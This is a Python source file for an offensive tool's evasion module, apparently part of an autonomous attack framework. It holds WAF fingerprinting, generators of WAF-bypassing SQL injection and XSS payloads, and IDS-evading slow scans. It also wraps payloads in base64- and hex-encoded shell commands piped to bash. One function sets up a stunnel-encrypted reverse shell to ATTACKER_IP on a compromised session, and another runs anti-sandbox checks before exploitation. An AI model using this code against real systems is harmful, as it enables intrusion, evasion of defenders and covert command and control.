"""
Evasion Techniques Module
WAF bypass, IDS/IPS evasion, anti-detection methods
"""

import re
import random
import time
from typing import Dict, List, Optional

class EvasionModule:
    """
    Advanced evasion techniques for bypassing security controls.
    """
    
    def __init__(self):
        self.waf_fingerprints = {
            'cloudflare': ['__cfduid', 'cf-ray', 'cloudflare'],
            'aws_waf': ['x-amzn-', 'aws-waf-token'],
            'akamai': ['akamai', 'ak-bmsc'],
            'imperva': ['incap_ses', 'visid_incap'],
            'f5': ['f5', 'bigip'],
            'sucuri': ['sucuri', 'x-sucuri-id'],
            'wordfence': ['wordfence', 'wfvt_']
        }
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1'
        ]
    
    def detect_waf(self, url: str, callback=None) -> Dict:
        """
        Detect Web Application Firewall presence and type.
        
        Args:
            url: Target URL
            callback: Optional callback
        
        Returns:
            WAF detection results
        """
        if callback:
            callback({'message': f'ðŸ” Detecting WAF on {url}...'})
        
        results = {
            'waf_detected': False,
            'waf_type': None,
            'confidence': 0,
            'indicators': []
        }
        
        # Send test request
        response = self._send_http_request(url, callback)
        
        if not response:
            return results
        
        # Check headers for WAF signatures
        headers = response.get('headers', {})
        body = response.get('body', '')
        
        for waf_name, signatures in self.waf_fingerprints.items():
            matches = 0
            found_indicators = []
            
            # Check headers
            for header_name, header_value in headers.items():
                for signature in signatures:
                    if signature.lower() in header_name.lower() or signature.lower() in str(header_value).lower():
                        matches += 1
                        found_indicators.append(f"Header: {header_name}")
            
            # Check response body
            for signature in signatures:
                if signature.lower() in body.lower():
                    matches += 1
                    found_indicators.append(f"Body contains: {signature}")
            
            if matches > 0:
                results['waf_detected'] = True
                results['waf_type'] = waf_name
                results['confidence'] = min(100, matches * 33)
                results['indicators'] = found_indicators
                
                if callback:
                    callback({'message': f'âœ… WAF detected: {waf_name.upper()} (Confidence: {results["confidence"]}%)'})
                
                break
        
        if not results['waf_detected'] and callback:
            callback({'message': 'âœ… No WAF detected'})
        
        return results
    
    def evade_waf_sqli(self, original_payload: str, waf_type: str = None, callback=None) -> List[str]:
        """
        Generate SQL injection payloads that bypass WAF.
        
        Args:
            original_payload: Original SQLi payload
            waf_type: Detected WAF type (optional)
            callback: Optional callback
        
        Returns:
            List of WAF-evading payloads
        """
        if callback:
            callback({'message': f'ðŸ”§ Generating WAF-evading SQL injection payloads...'})
        
        evaded_payloads = []
        
        # Technique 1: Comment-based evasion
        evaded_payloads.append(original_payload.replace(' ', '/***/'))
        evaded_payloads.append(original_payload.replace(' ', '/**/'))
        evaded_payloads.append(original_payload.replace('=', '/*!50000=*/'))
        
        # Technique 2: Case variation
        evaded_payloads.append(self._random_case(original_payload))
        
        # Technique 3: URL encoding
        evaded_payloads.append(self._double_url_encode(original_payload))
        
        # Technique 4: Inline comments
        evaded_payloads.append(original_payload.replace('UNION', 'UN/**/ION'))
        evaded_payloads.append(original_payload.replace('SELECT', 'SEL/**/ECT'))
        
        # Technique 5: Hex encoding
        evaded_payloads.append(self._hex_encode_strings(original_payload))
        
        # Technique 6: Whitespace alternatives
        evaded_payloads.append(original_payload.replace(' ', '%09'))  # Tab
        evaded_payloads.append(original_payload.replace(' ', '%0A'))  # Line feed
        evaded_payloads.append(original_payload.replace(' ', '%0D'))  # Carriage return
        
        # Technique 7: Parentheses nesting
        evaded_payloads.append(original_payload.replace('SELECT', '(SELECT)'))
        
        # WAF-specific evasion
        if waf_type == 'cloudflare':
            # Cloudflare-specific bypasses
            evaded_payloads.append(original_payload.replace('OR', '||'))
            evaded_payloads.append(original_payload + ' AND 1=1')
        
        elif waf_type == 'imperva':
            # Imperva-specific bypasses
            evaded_payloads.append(original_payload.replace(' ', '%20'))
            evaded_payloads.append('/*!50000' + original_payload + '*/')
        
        if callback:
            callback({'message': f'âœ… Generated {len(evaded_payloads)} WAF-evading payloads'})
        
        return evaded_payloads
    
    def evade_waf_xss(self, original_payload: str, waf_type: str = None, callback=None) -> List[str]:
        """
        Generate XSS payloads that bypass WAF.
        
        Args:
            original_payload: Original XSS payload
            waf_type: Detected WAF type
            callback: Optional callback
        
        Returns:
            List of WAF-evading XSS payloads
        """
        if callback:
            callback({'message': f'ðŸ”§ Generating WAF-evading XSS payloads...'})
        
        evaded_payloads = []
        
        # Technique 1: Case obfuscation
        evaded_payloads.append('<ScRiPt>alert(1)</sCrIpT>')
        
        # Technique 2: Event handler alternatives
        evaded_payloads.append('<img src=x onerror=alert(1)>')
        evaded_payloads.append('<svg/onload=alert(1)>')
        evaded_payloads.append('<body onload=alert(1)>')
        evaded_payloads.append('<marquee onstart=alert(1)>')
        
        # Technique 3: Encoding
        evaded_payloads.append('<script>&#97;&#108;&#101;&#114;&#116;(1)</script>')
        evaded_payloads.append('<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>')
        
        # Technique 4: String concatenation
        evaded_payloads.append('<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>')
        
        # Technique 5: Alternative execution contexts
        evaded_payloads.append('<script>window["ale"+"rt"](1)</script>')
        evaded_payloads.append('<script>self["ale"+"rt"](1)</script>')
        
        # Technique 6: DOM-based XSS
        evaded_payloads.append('#<script>alert(1)</script>')
        evaded_payloads.append('javascript:alert(1)//')
        
        # Technique 7: Polyglot XSS
        evaded_payloads.append('javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>')
        
        if callback:
            callback({'message': f'âœ… Generated {len(evaded_payloads)} WAF-evading XSS payloads'})
        
        return evaded_payloads
    
    def slow_scan_mode(self, min_delay: int = 5, max_delay: int = 30, callback=None):
        """
        Enable slow scanning to evade IDS/IPS.
        
        Args:
            min_delay: Minimum delay between requests (seconds)
            max_delay: Maximum delay between requests (seconds)
            callback: Optional callback
        """
        delay = random.randint(min_delay, max_delay)
        
        if callback:
            callback({'message': f'â±ï¸ Slow scan mode: Waiting {delay} seconds to avoid detection...'})
        
        time.sleep(delay)
    
    def rotate_user_agent(self, callback=None) -> str:
        """
        Rotate user agent to avoid fingerprinting.
        
        Returns:
            Random user agent string
        """
        user_agent = random.choice(self.user_agents)
        
        if callback:
            callback({'message': f'ðŸ”„ Rotating User-Agent: {user_agent[:50]}...'})
        
        return user_agent
    
    def obfuscate_payload(self, payload: str, method: str = 'auto', callback=None) -> str:
        """
        Obfuscate payload to evade detection.
        
        Args:
            payload: Original payload
            method: 'base64', 'hex', 'unicode', 'gzip', or 'auto'
            callback: Optional callback
        
        Returns:
            Obfuscated payload
        """
        if callback:
            callback({'message': f'ðŸ” Obfuscating payload using {method} method...'})
        
        if method == 'base64' or method == 'auto':
            import base64
            encoded = base64.b64encode(payload.encode()).decode()
            obfuscated = f"echo {encoded} | base64 -d | bash"
            
        elif method == 'hex':
            hex_payload = payload.encode().hex()
            obfuscated = f"echo {hex_payload} | xxd -r -p | bash"
            
        elif method == 'unicode':
            unicode_payload = ''.join([f'\\u{ord(c):04x}' for c in payload])
            obfuscated = f"$'{unicode_payload}'"
            
        elif method == 'gzip':
            import gzip
            import base64
            compressed = gzip.compress(payload.encode())
            encoded = base64.b64encode(compressed).decode()
            obfuscated = f"echo {encoded} | base64 -d | gunzip | bash"
        
        else:
            obfuscated = payload
        
        if callback:
            callback({'message': f'âœ… Payload obfuscated (Original: {len(payload)} bytes â†’ Obfuscated: {len(obfuscated)} bytes)'})
        
        return obfuscated
    
    def encrypt_traffic(self, session_id: str, callback=None) -> Dict:
        """
        Encrypt C2 communications to evade network monitoring - REAL IMPLEMENTATION.
        
        Args:
            session_id: Session to encrypt
            callback: Optional callback
        
        Returns:
            Encryption status
        """
        if callback:
            callback({'message': f'ðŸ”’ Encrypting traffic for session {session_id}...'})
        
        results = {
            'success': False,
            'method': 'ssl_tunnel',
            'session_id': session_id
        }
        
        try:
            from session_store import get_session_store
            store = get_session_store()
            session = store.get_session(session_id)
            
            if not session:
                return results
            
            # Setup SSL/TLS tunnel using stunnel or socat
            from autonomous_session_manager import autonomous_session_manager
            
            # Install stunnel if not present
            install_cmd = "which stunnel || apt-get install -y stunnel4 2>/dev/null || yum install -y stunnel 2>/dev/null"
            autonomous_session_manager._run_command(session_id, install_cmd, callback)
            
            # Configure stunnel for SSL wrapping
            stunnel_config = """
[reverse-shell]
client = yes
accept = 127.0.0.1:4445
connect = ATTACKER_IP:4444
cert = /tmp/stunnel.pem
"""
            
            # Create self-signed certificate
            cert_cmd = "openssl req -new -x509 -days 365 -nodes -out /tmp/stunnel.pem -keyout /tmp/stunnel.pem -subj '/CN=localhost' 2>/dev/null"
            autonomous_session_manager._run_command(session_id, cert_cmd, callback)
            
            # Write stunnel config
            config_cmd = f"cat > /tmp/stunnel.conf << 'EOF'\n{stunnel_config}\nEOF"
            autonomous_session_manager._run_command(session_id, config_cmd, callback)
            
            # Start stunnel
            start_cmd = "stunnel /tmp/stunnel.conf &"
            output = autonomous_session_manager._run_command(session_id, start_cmd, callback)
            
            if callback:
                callback({'message': f'âœ… SSL/TLS tunnel established via stunnel'})
            
            results['success'] = True
            results['tunnel_config'] = '/tmp/stunnel.conf'
            
        except Exception as e:
            if callback:
                callback({'message': f'âŒ Traffic encryption failed: {str(e)[:100]}'})
        
        return results
    
    def anti_sandbox_checks(self, session_id: str, callback=None) -> Dict:
        """
        Perform anti-sandbox checks before exploitation.
        
        Args:
            session_id: Session to check
            callback: Optional callback
        
        Returns:
            Sandbox detection results
        """
        if callback:
            callback({'message': f'ðŸ” Running anti-sandbox checks...'})
        
        results = {
            'is_sandbox': False,
            'indicators': []
        }
        
        from autonomous_session_manager import autonomous_session_manager
        
        # Check 1: VM detection
        vm_check = autonomous_session_manager._run_command(
            session_id, 
            'systemd-detect-virt 2>/dev/null || dmidecode | grep -i virtual',
            callback
        )
        
        if vm_check and any(vm in vm_check.lower() for vm in ['vmware', 'virtualbox', 'qemu', 'kvm']):
            results['is_sandbox'] = True
            results['indicators'].append('VM detected')
        
        # Check 2: Low uptime (sandbox often has fresh boot)
        uptime_check = autonomous_session_manager._run_command(session_id, 'uptime -s', callback)
        
        # Check 3: Limited resources
        cpu_check = autonomous_session_manager._run_command(session_id, 'nproc', callback)
        if cpu_check and int(cpu_check.strip()) < 2:
            results['indicators'].append('Low CPU count')
        
        # Check 4: Common sandbox artifacts
        artifacts = autonomous_session_manager._run_command(
            session_id,
            'ls /usr/bin/ | grep -E "cuckoo|sandbox|analyst"',
            callback
        )
        
        if artifacts:
            results['is_sandbox'] = True
            results['indicators'].append('Sandbox artifacts found')
        
        if callback:
            if results['is_sandbox']:
                callback({'message': f'âš ï¸ SANDBOX DETECTED! Indicators: {", ".join(results["indicators"])}'})
            else:
                callback({'message': f'âœ… No sandbox detected - safe to proceed'})
        
        return results
    
    def _send_http_request(self, url: str, callback=None) -> Optional[Dict]:
        """Send HTTP request - REAL IMPLEMENTATION."""
        import requests
        
        try:
            # Disable SSL warnings for testing
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            response = requests.get(url, timeout=10, verify=False, allow_redirects=True)
            
            return {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'body': response.text,
                'url': response.url
            }
            
        except Exception as e:
            if callback:
                callback({'message': f'  âš ï¸ HTTP request failed: {str(e)[:100]}'})
        
        return None
    
    def _random_case(self, text: str) -> str:
        """Randomize case of text."""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)
    
    def _double_url_encode(self, text: str) -> str:
        """Double URL encode text."""
        import urllib.parse
        encoded_once = urllib.parse.quote(text, safe='')
        encoded_twice = urllib.parse.quote(encoded_once, safe='')
        return encoded_twice
    
    def _hex_encode_strings(self, payload: str) -> str:
        """Hex encode string literals in payload - REAL IMPLEMENTATION."""
        import re
        
        # Find string literals in SQL and hex encode them
        def hex_encode_match(match):
            string_content = match.group(1)
            hex_encoded = '0x' + string_content.encode().hex()
            return hex_encoded
        
        # Replace single-quoted strings with hex encoding
        result = re.sub(r"'([^']+)'", hex_encode_match, payload)
        
        return result

# Singleton instance
evasion_module = EvasionModule()
